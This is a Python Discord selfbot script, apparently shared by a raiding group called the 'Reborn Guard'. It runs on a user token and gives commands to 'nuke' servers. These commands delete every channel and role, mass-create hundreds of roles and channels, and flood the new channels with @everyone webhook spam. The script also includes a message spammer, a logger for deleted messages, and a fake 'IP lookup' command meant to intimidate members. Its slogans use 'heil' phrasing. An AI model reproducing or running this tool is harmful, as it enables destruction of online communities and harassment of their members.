###CLARIFICATION 5 SELFBOT###
###FOR MEMBERS OF THE REBORN GUARD BELOW CLARIFICATION 4###
###DEVELOPED AND CODED BY JAK###
###LAST UPDATED JULY 2ND, 2023###

###IMPORTS###
import os
os.system('pip uninstall discord')
os.system('pip install discord.py==1.7.3')
import discord
import requests
import colorama
from colorama import Fore as C
from colorama import Style as S
import aiohttp
import asyncio
from discord.ext import commands
import time
import sys
import random

###COLORS###
red = C.RED
lightred = C.LIGHTRED_EX
blue = C.BLUE
magenta = C.MAGENTA
green = C.GREEN
yellow = C.YELLOW
black = C.BLACK
white = C.WHITE
reset = S.RESET_ALL

###SETTINGS###
token = input(f"{magenta}[+] Token: ")
prefix = input(f"{magenta}[+] Prefix: ")
headers = {"Authorization": token}
channeln = "heil RG"
rolen = "Nuked by the Reborn Guard | Heil the Almighty Elitest"
spamc = """
||@everyone||
```Server Seized By the Reborn Guard || Heil the Almighty Elitest!```
https://discord.gg/dRgQudbQRs
"""
servnick = "Nuked By The Guard | Gyatvivid!"
status = "Heil the Almighty Elitest! | Gyatvivid!"
webname = "Reborn Guard"
banner = f"""
{magenta}
╭━━━┳━━━╮╭━━━╮╱╱╭╮╭━┳╮╱╱╱╱╭╮
┃╭━╮┃╭━╮┃┃╭━╮┃╱╱┃┃┃╭┫┃╱╱╱╭╯╰╮
┃╰━╯┃┃╱╰╯┃╰━━┳━━┫┣╯╰┫╰━┳━┻╮╭╯
┃╭╮╭┫┃╭━╮╰━━╮┃┃━┫┣╮╭┫╭╮┃╭╮┃┃
┃┃┃╰┫╰┻━┃┃╰━╯┃┃━┫╰┫┃┃╰╯┃╰╯┃╰╮
╰╯╰━┻━━━╯╰━━━┻━━┻━┻╯╰━━┻━━┻━╯
"""
jak = discord.Client()
jak = commands.Bot(
  command_prefix=prefix,
  intents=discord.Intents.all(),
  self_bot=True
)
  
###FUNCTIONS###
def clear_console():
  try:
    os.system('clear')
  except:
    os.system('cls')

def loading():
  clear_console()
  print(banner)
  time.sleep(2)
  clear_console()

def kill():
  sys.exit()

async def create_roles(guild):
  role_color = 0xFF0000
  for _ in range(300):
    payload = {
      "name": rolen,
      "color": role_color
    }
    async with aiohttp.ClientSession() as session:
      async with session.post(f"https://discord.com/api/v9/guilds/{guild.id}/roles", json=payload, headers=headers) as response:
        if response.status in [200, 201, 202, 203, 204, 205]:
          print(f"{green}[+] {_+1} Roles Created")
        if response.status == 429:
          retry_after = (await response.json())['retry after']
          await asyncio.sleep(retry_after)
        else:
          print(f"{red}[-] Failed to create role! - {response.status}")

async def delete_channels(guild):
  for channel in guild.channels:
    async with aiohttp.ClientSession() as session:
      async with session.delete(f"https://discord.com/api/v9/channels/{channel.id}", headers=headers) as response:
        if response.status in [200, 204]:
          print(f"[+] Channel {channel.name} deleted!")
        if response.status == 429:
          retry_after = (await response.json())['retry after']
          await asyncio.sleep(retry_after)
        else:
          print(f"[-] Failed to Delete {channel.name} - {response.status}")

async def create_channels(guild, amount):
  amount = int(amount)
  for _ in range(amount):
    payload = {
      "name": channeln,
      "type": 0
    }
    async with aiohttp.ClientSession() as session:
      async with session.post(f"https://discord.com/api/v9/guilds/{guild.id}/channels", json=payload, headers=headers) as response:
        if response.status in [200, 201, 202, 203, 204, 205]:
          print(f"{green}[+] Created {_+1} Channels!")
        if response.status == 429:
          retry_after = (await response.json())['retry after']
          await asyncio.sleep(retry_after)
        else:
          print(f"{red}[-] Failed to create channel! - {response.status}")

async def delete_roles(guild):
  for role in guild.roles:
    if role.name != "@everyone":
      endpoint = f"https://discord.com/api/v9/guilds/{guild.id}/roles/{role.id}"
      async with aiohttp.ClientSession() as session:
        async with session.delete(endpoint, headers=headers) as response:
          if response.status in [200, 201, 202, 203, 204, 205]:
            print(f"{green}[+] Deleted {role.name}")
          if response.status == 429:
            retry_after = (await response.json())['retry after']
            await asyncio.sleep(retry_after)
          else:
            print(f"{red}[-] Failed to delete {role.name} - {response.status}")









###EVENTS###
@jak.event
async def on_guild_channel_create(channel):
  try:
    while True:
      webhook = await channel.create_webhook(name=webname)
      await webhook.send(spamc)
  except:
    pass

@jak.event
async def on_connect():
  loading()
  print(f"""
{green}
[+] Logged in as {jak.user}!
[+] Prefix is {prefix}
[+] User is in {len(jak.guilds)} Guilds!
""")
  await jak.change_presence(status=discord.Status.dnd, activity=discord.Game("Heil the Almighty Elitest | Gyatvivid!"))

@jak.event
async def on_message_delete(message):
  guild = message.guild
  channel = message.channel
  author = message.author
  print(f"{green}[+] Message Deleted in {guild} - Channel: {channel} - Message Author: {author} - Message: {message.content}")

###COMMANDS###
@jak.command()
async def quit(ctx):
  await ctx.reply("```Code Killed!```")
  kill()

@jak.command()
async def clear(ctx):
  await ctx.reply("```Console Cleared!```")
  clear()

@jak.command()
async def massrole(ctx):
  guild = ctx.guild
  await create_roles(guild)

@jak.command()
async def cdel(ctx):
  guild = ctx.guild
  await delete_channels(guild)

@jak.command()
async def nitrousers(ctx):
    nitro_basic_users = []
    nitro_premium_users = []

    for member in ctx.guild.members:
        if member.premium_since is not None:
            if member.premium_since.premium_type == 2:  # Nitro Premium (premium_type = 2)
                nitro_premium_users.append(member.display_name)
            else:
                nitro_basic_users.append(member.display_name)

    message = (
        "👿 | `Nitro Basic` | 👿\n"
        "> List of users with Nitro Basic\n\n"
        + "\n".join(f"👿 {name}" for name in nitro_basic_users)
        + "\n\n👿 | `Nitro Premium` | 👿\n"
        "> List of users with Nitro Premium\n\n"
        + "\n".join(f"👿 {name}" for name in nitro_premium_users)
    )

    await ctx.send(message)

@jak.command()
async def mch(ctx, amount):
  guild = ctx.guild
  if amount == "":
    amount = 50
    await create_channels(guild, amount)
  else:
    await create_channels(guild, amount)

@jak.command()
async def cnuke(ctx):
  await delete_channels(ctx.guild)
  await create_channels(ctx.guild, 50)

@jak.command()
async def status(ctx, name):
  await jak.change_presence(status=discord.Status.dnd, activity=discord.Game(name))
  await ctx.reply("```Changed Status! | Gyatvivid!```")

@jak.command(aliases=['userinfo', 'userwhois'])
async def whois(ctx, member: discord.Member):
  response = (
    f"```User Information```\n"
      f"> Username: {member.name}\n"
      f"> Discriminator: {member.discriminator}\n"
      f"> ID: {member.id}\n"
      f"> Status: {member.status}\n"
      f"> Joined At: {member.joined_at.strftime('%Y-%m-%d %H:%M:%S')}\n"
      f"> Created At: {member.created_at.strftime('%Y-%m-%d %H:%M:%S')}\n"
      f"> Avatar URL: {member.avatar_url}"
)
  await ctx.reply(response)

@jak.command(aliases=['guildwhois', 'servwhois', 'serverwhois'])
async def serverinfo(ctx):
  guild = ctx.guild
  total_members = guild.member_count
  online_members = sum(member.status != discord.Status.offline for member in guild.members)
  text_channels = len(guild.text_channels)
  voice_channels = len(guild.voice_channels)
  server_owner = guild.owner
  server_logo = guild.icon_url
  response = (
    f"```Server Information```\n"
    f"> Server Name: {guild.name}\n"
    f"> Server ID: {guild.id}\n"
    f"> Total Members: {total_members}\n"
    f"> Online Members: {online_members}\n"
    f"> Text Channels: {text_channels}\n"
    f"> Voice Channels: {voice_channels}\n"
    f"> Server Owner: {server_owner}\n"
    f"> Server Logo: {server_logo}\n"
  )
  await ctx.send(response)

@jak.command()
async def rdel(ctx):
  guild = ctx.guild
  await delete_roles(guild)

@jak.command()
async def rnuke(ctx):
  tasks = [massrole(ctx), rdel(ctx)]
  await asyncio.gather(*tasks)

@jak.command()
async def nuke(ctx):
  tasks = [cnuke(ctx), rnuke(ctx)]
  await asyncio.gather(*tasks)

@jak.command()
async def spam(ctx, amount, *, message):
  amount = int(amount)
  for i in range(amount):
    await ctx.send(message)

@jak.command(aliases=['av'])
async def avatar(ctx, member: discord.Member):
  avatar = member.avatar_url
  await ctx.reply(avatar)

@jak.command()
async def membercount(ctx):
  guild = ctx.guild
  members = guild.member_count
  await ctx.reply(f"> {members}")

@jak.command()
async def servav(ctx):
  guild = ctx.guild
  av = guild.icon_url
  await ctx.reply(av)

@jak.command()
async def change(ctx):
  await ctx.guild.edit(name=servnick)

tasks = []

@jak.command()
async def purge(ctx, limit):
    session = aiohttp.ClientSession()
    limit = int(limit)
    await ctx.message.delete()

    channel = jak.get_channel(ctx.channel.id)

    messages = []
    async for message in channel.history(limit=limit):
        if message.author == ctx.author:
            messages.append(message)

    for message in messages:
        url = f"https://discord.com/api/v10/channels/{message.channel.id}/messages/{message.id}"
        task = asyncio.create_task(delete_message(url, message))
        tasks.append(task)

    await asyncio.gather(*tasks)
    tasks.clear()

async def delete_message(url, message):
    session = aiohttp.ClientSession()
    async with session.delete(url) as resp:
        if resp.status == 204:
            print(f"{green}[+] Deleted message: {message.content} - {resp.status}")
        if resp.status == 429:
          retry_after = (await resp.json())['retry after']
          await asyncio.sleep(retry_after)
        else:
            print(f"{red}[-] Failed to delete message: {message.content} - {resp.status}")

@jak.command()
async def otax(ctx, member: discord.Member):
    await ctx.reply(f"```Otaxing {member}!```")
    await asyncio.sleep(0.4)
    message = await ctx.send(f"```Otax Finished!```")
    number = [1, 2, 3, 4, 5, 6, 7, 8, 9, 0]
    ip = (
        f"{random.choice(number)}{random.choice(number)}{random.choice(number)}.{random.choice(number)}{random.choice(number)}.{random.choice(number)}{random.choice(number)}{random.choice(number)}.{random.choice(number)}{random.choice(number)}{random.choice(number)}"
    )
    await asyncio.sleep(0.2)
    await message.edit(
        content=f"```\n{member} Information```\n\n```\nUsername: {member.name}\nIP: {ip}\nAvatar: {member.avatar_url}\n```"
    )


jak.run(token, bot=False)
